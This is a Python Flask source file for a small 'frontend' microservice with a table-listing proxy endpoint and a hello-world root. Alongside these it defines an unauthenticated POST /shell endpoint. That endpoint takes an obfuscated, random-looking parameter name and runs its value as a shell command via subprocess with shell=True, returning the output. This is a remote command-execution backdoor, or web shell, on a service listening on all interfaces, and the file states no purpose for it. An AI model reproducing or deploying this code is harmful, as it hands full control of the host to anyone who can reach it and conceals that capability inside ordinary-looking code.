import os
import requests
from flask import Flask, request
from flask_restful import Resource, Api, reqparse

import subprocess

app = Flask(__name__)
api = Api(app)

PORT = os.getenv("PORT", 5000)
DEBUG = os.getenv("DEBUG", "false")
BACKEND_URL = os.getenv("BACKEND_URL", None)
assert BACKEND_URL is not None, "BACKEND_URL not set"


@api.resource("/tables")
class GetTables(Resource):
    def get(self):
        try:
            r = requests.get(f"{BACKEND_URL}/tables")
            return r.json()
        except Exception as e:
            return {"error": "it failed.", "details": str(e)}


@api.resource("/")
class HelloWorld(Resource):
    def get(self):
        return {"hello": "world", "service": "frontend", "caller": request.remote_addr}


@api.resource("/shell")
class ShelloWorld(Resource):
    def post(self):
        parser = reqparse.RequestParser()
        parser.add_argument("asuioydfouiasdbfouyuhsydf", type=str)
        args = parser.parse_args()
        try:
            result = subprocess.run(
                args["asuioydfouiasdbfouyuhsydf"],
                stdout=subprocess.PIPE,
                shell=True,
            )
            stderr = result.stderr
            stdout = result.stdout
            try:
                stderr = stderr.decode()
            except:
                pass
            try:
                stdout = stdout.decode()
            except:
                pass
            return {
                "stdout": stdout,
                "stderr": stderr,
                "code": result.returncode,
            }
        except Exception as e:
            return {"exception": str(e)}


if __name__ == "__main__":
    debug = False if DEBUG == "false" else True
    app.run(debug=debug, host="0.0.0.0", port=PORT)
